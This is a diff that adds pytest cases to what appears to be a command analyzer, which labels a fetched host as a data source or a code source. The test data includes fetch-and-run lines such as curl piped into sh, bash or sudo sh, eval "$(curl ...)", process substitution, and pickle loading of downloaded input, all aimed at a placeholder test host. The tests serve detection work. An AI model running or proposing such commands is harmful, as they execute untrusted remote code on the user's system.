@@ -376,6 +376,69 @@ def test_piped_json_tool_keeps_only_the_fetched_host():
     assert _hosts(_exec_found(cmd)) == {"hn.algolia.com"}
 
 
+def _host_role(cmd: str, host: str) -> Role:
+    (role,) = {f.role for f in _exec_found(cmd) if f.kind is EntityKind.HOST and f.value == host}
+    return role
+
+
+@pytest.mark.parametrize(
+    "stage",
+    [
+        "python3 -m json.tool",
+        "python3 -c \"import json,sys; print(json.load(sys.stdin)['x'])\"",
+        "node -e \"let s='';process.stdin.on('data',c=>s+=c)\"",
+        "python3 tools/fmt.py",
+        "python3 -m json.tool | head -100",
+        "jq .",
+    ],
+)
+def test_host_piped_into_a_program_of_its_own_is_a_data_source(stage):
+    cmd = f"curl -s https://api.rookwell.test/x 2>/dev/null | {stage}"
+    assert _host_role(cmd, "api.rookwell.test") is Role.DATA_SOURCE
+
+
+@pytest.mark.parametrize(
+    "stage",
+    [
+        "python3",
+        "python3 -",
+        "bash",
+        "sh -s",
+        "sudo sh",
+        "node",
+        'python3 -c "exec(sys.stdin.read())"',
+        'bash -c "$(cat)"',
+        "python3 -m json.tool | sh",
+    ],
+)
+def test_host_piped_into_a_stage_that_runs_stdin_is_a_code_source(stage):
+    cmd = f"curl -s https://api.rookwell.test/x | {stage}"
+    assert _host_role(cmd, "api.rookwell.test") is Role.CODE_SOURCE
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        # A pipe the parse does not show as a pipeline keeps the text rule.
+        "sh -c 'curl -s https://api.rookwell.test/x | sh'",
+        "curl -s https://api.rookwell.test/x | python3 -m json.tool; sh -c 'curl -s https://api.rookwell.test/y | sh'",
+        # A pipe hidden in an argument is not balanced out by a wrapped data stage.
+        "bash -c 'curl -s https://api.rookwell.test/x | sh'; echo x | env python3 -m json.tool",
+        "echo 'curl -s https://api.rookwell.test/x | bash' > a.sh; bash a.sh; echo | /bin/sh -c true",
+        "curl -s https://api.rookwell.test/x | tee >(sh) | python3 -m json.tool",
+        "cat > a.sh <<'EOF'\ncurl -s https://api.rookwell.test/x | sh\nEOF\necho | env python3 -m json.tool",
+        'curl -s https://api.rookwell.test/x | python3 -c "import pickle,sys; pickle.load(sys.stdin.buffer)"',
+        "curl -s https://api.rookwell.test/x | python3 -c \"__import__('builtins').exec(input())\"",
+        "curl -s https://api.rookwell.test/x | python3 -m pdb tools/fmt.py",
+        # Process substitution and eval are unchanged.
+        "source <(curl -s https://api.rookwell.test/x)",
+        'eval "$(curl -s https://api.rookwell.test/x)"',
+    ],
+)
+def test_code_source_role_the_parse_does_not_settle_is_kept(cmd):
+    assert _host_role(cmd, "api.rookwell.test") is Role.CODE_SOURCE
+
+
 @pytest.mark.parametrize(
     "cmd",
     [
